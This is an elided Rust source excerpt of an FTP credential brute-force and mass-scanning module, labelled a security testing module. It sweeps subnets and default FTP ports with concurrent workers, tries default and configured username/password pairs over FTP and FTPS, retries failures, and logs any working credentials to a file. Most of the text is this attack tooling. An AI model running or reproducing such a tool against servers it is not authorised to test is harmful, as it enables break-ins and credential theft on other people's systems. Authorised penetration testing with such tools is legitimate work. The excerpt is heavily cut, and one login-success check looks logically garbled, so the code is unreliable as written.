...
const DEFAULT_FTP_PORTS: &[u16] = &[21, 2121, 8021];
...
pub struct FtpBruteforceConfig {
    #[serde(skip)]
    pub target: String,
    pub port: u16,
...
async fn run_single_target_bruteforce(target: &str, is_subnet: bool) -> Result<()> {
    ...
    if targets.len() > 1 {
        ...
        run_ftp_bruteforce(config).await
    }
}

async fn run_sequential_bruteforce(targets: Vec<String>, base_config: FtpBruteforceConfig) -> Result<()> {
    for (idx, target) in targets.iter().enumerate() {
        println!("\n{}", format!("=== Target {}/{}: {} ===", idx + 1, targets.len(), target).bright_cyan());
        let mut config = base_config.clone();
        config.target = target.clone();

        if let Err(e) = run_ftp_bruteforce(config).await {
...
async fn run_parallel_bruteforce(targets: Vec<String>, base_config: FtpBruteforceConfig) -> Result<()> {
    ...
    for target in targets {
        ...
        let task = tokio::spawn(async move {
            ...
            run_ftp_bruteforce(target_config).await
        });
...
async fn run_batch_scanner(target: &str) -> Result<()> {
    ...
    let mut config = BatchScanConfig {
        targets: Vec::new(),
        ports: DEFAULT_FTP_PORTS.to_vec(),
        ...
        max_concurrent: 50,
        output_file: "ftp_scan_results.txt".to_string(),
        verbose: false,
    };
    ...
    if prompt_yes_no("Use default ports (21, 2121, 8021)? (y/n): ", true) {
        config.ports = DEFAULT_FTP_PORTS.to_vec();
    } else {
...
async fn run_quick_check(target: &str, is_subnet: bool) -> Result<()> {
    ...
    let port: u16 = prompt_required("Port (default 21): ")
        .parse()
        .unwrap_or(21);
    ...
    for target_ip in targets {
        ...
        for (username, password) in DEFAULT_CREDENTIALS {
            match try_ftp_login_simple(&target_ip, port, username, password, 3).await {
                Ok(true) => {
                    let result = format!("{}:{} - {}/{}",
...
async fn run_ftp_bruteforce(config: FtpBruteforceConfig) -> Result<()> {
    ...
    if config.pre_validate {
        println!("[*] Validating target is FTP service...");
        match validate_ftp_target(&addr, &config).await {
...
// ============================================================
// CORE FTP LOGIN FUNCTIONS
// ============================================================

async fn try_ftp_login(addr: &str, user: &str, pass: &str, config: &FtpBruteforceConfig) -> Result<bool> {
    ...
    match timeout(
            ...
            match timeout(
                ...
                Ok(Err(e)) => {
                    ...
                    if msg.contains("530") {
                        ...
                        // Will try FTPS below if enabled
                    } else if msg.contains("421") {
                        if verbose {
                            println!("[-] {} - Server reported too many connections (421).", addr);
                        }
                        return Ok(false);
                    } else {
                        if verbose {
                            println!("[!] FTP login error for {} ({}:{}): {}", addr, user, pass, msg);
                        }
                ...
                Err(_) => {
                    if verbose {
                        println!("[!] FTP login timeout for {} ({}:{})", addr, user, pass);
                    }
                    return Ok(false);
                }
            }
        ...
        Ok(Err(e)) => {
            ...
            if msg.contains("SSL/TLS required") || msg.contains("TLS required on the control channel") || msg.contains("220 TLS go first") || msg.contains("SSL connection required") {
                ...
                if verbose {
                    println!("[-] {} - Server reported too many connections during connect (421).", addr);
                }
                return Ok(false);
            } else {
                if verbose {
                    println!("[!] FTP connection error to {} ({}:{}): {}", addr, user, pass, msg);
                }
    ...
    let mut ftp_tls = match timeout(
        ...
        _ => {
            if verbose {
                println!("[!] FTPS base connect failed for {} ({}:{}): Connection timeout", addr, user, pass);
            }
            return Err(anyhow!("FTPS base connect failed: Connection timeout"));
        }
    };
    ...
    ftp_tls = match timeout(
        Duration::from_secs(config.connection_timeout),
        ftp_tls.into_secure(connector, domain)
    ).await {
        Ok(Ok(stream)) => stream,
        Ok(Err(e)) => {
            if verbose {
                println!("[!] TLS upgrade failed for {} ({}:{}): {}", addr, user, pass, e);
            }
            return Err(anyhow!("TLS upgrade failed: {}", e));
        }
        Err(_) => {
            if verbose {
                println!("[!] TLS upgrade timeout for {} ({}:{})", addr, user, pass);
            }
            return Err(anyhow!("TLS upgrade timeout"));
        }
    };

    match timeout(
        Duration::from_secs(config.read_timeout),
        ftp_tls.login(user, pass)
    ).await {
        Ok(Ok(_)) => {
        ...
        Ok(Err(e)) => {
            ...
            if msg.contains("530") {
                ...
                if verbose {
                    println!("[!] FTPS error for {} ({}:{}): {}", addr, user, pass, msg);
                }
        ...
        Err(_) => {
            if verbose {
                println!("[!] FTPS login timeout for {} ({}:{})", addr, user, pass);
            }
            Ok(false)
        }
    }
...
async fn try_ftp_login_simple(
    ...
    match timeout(
        ...
        Ok(Ok(mut ftp)) => {
            match timeout(Duration::from_secs(timeout_secs), ftp.login(username, password)).await {
                Ok(Ok(_)) => {
                    let _ = ftp.quit().await;
                    return Ok(true);
                }
    ...
    // Try FTPS if plain FTP didn't work
    let mut ftp_tls = match timeout(
        Duration::from_secs(timeout_secs),
        AsyncNativeTlsFtpStream::connect(&addr)
    ).await {
    ...
    match timeout(Duration::from_secs(timeout_secs), ftp_tls.login(username, password)).await {
        Ok(Ok(_)) => {
            let _ = ftp_tls.quit().await;
            Ok(true)
        }
        Ok(Err(e)) => {
            let msg = e.to_string();
            Ok(msg.contains("530") == false && msg.contains("success") || msg.contains("230"))
        }
        _ => Ok(false),
    }
}
...
fn spawn_worker(
    ...
    tokio::spawn(async move {
        loop {
            ...
            let mut attempt_result = try_ftp_login(&addr, &user, &pass, &config).await;
            ...
            while config.retry_on_error && retry_count < config.max_retries && attempt_result.is_err() {
                ...
                attempt_result = try_ftp_login(&addr, &user, &pass, &config).await;
            }
...
async fn initialize_output_file(output_file: &str, config: &FtpBruteforceConfig) -> Result<()> {
    if !config.append_mode {
        let mut f = File::create(output_file).await?;
        f.write_all(format!("# FTP Results - {}\n", chrono::Local::now()).as_bytes()).await?;
...
async fn validate_ftp_target(addr: &str, config: &FtpBruteforceConfig) -> Result<()> {
    match timeout(
        Duration::from_secs(config.connection_timeout),
        AsyncFtpStream::connect(addr)
    ).await {
        Ok(Ok(_)) => Ok(()),
        _ => Err(anyhow!("Cannot connect to FTP server")),
    }
}
...
async fn execute_batch_scan(config: BatchScanConfig) -> Result<()> {
    ...
    println!("Open FTP ports:        {}", open_ports);
...
async fn scan_target(ip: String, config: &BatchScanConfig) -> Vec<ScanResult> {
    ...
    for &port in &config.ports {
        ...
        for (username, password) in &config.credentials {
            ...
            match try_ftp_login_simple(&ip, port, username, password,
...
async fn check_port(ip: &str, port: u16, timeout_duration: Duration) -> Result<Option<String>> {
    ...
    match timeout(timeout_duration, AsyncFtpStream::connect(&addr)).await {
        Ok(Ok(mut stream)) => {
            let _ = stream.quit().await;
            Ok(Some("FTP service".to_string()))
        }
        _ => Ok(None),
    }
}
...
async fn build_interactive_config(target: &str) -> Result<FtpBruteforceConfig> {
    println!();
    println!("{}", "[Interactive Configuration]".bold().green());
    println!();

    let port = prompt_port(21);
    ...
    let try_ftps = prompt_yes_no("Try FTPS if plain FTP fails? (y/n): ", true);

    Ok(FtpBruteforceConfig {
...
async fn load_and_validate_config(path: &str, target: &str) -> Result<FtpBruteforceConfig> {
    let content = tokio::fs::read_to_string(path).await?;
    let mut config: FtpBruteforceConfig = serde_json::from_str(&content)?;
...
async fn save_config(config: &FtpBruteforceConfig, path: &str) -> Result<()> {
    let json = serde_json::to_string_pretty(config)?;
    tokio::fs::write(path, json).await?;
    Ok(())
}

fn print_config_summary(config: &FtpBruteforceConfig) {
...
fn display_banner() {
    println!();
    println!("{}", "╔══════════════════════════════════════════════╗".bright_cyan());
    println!("{}", "║   FTP SECURITY TESTING MODULE                ║".bright_cyan());
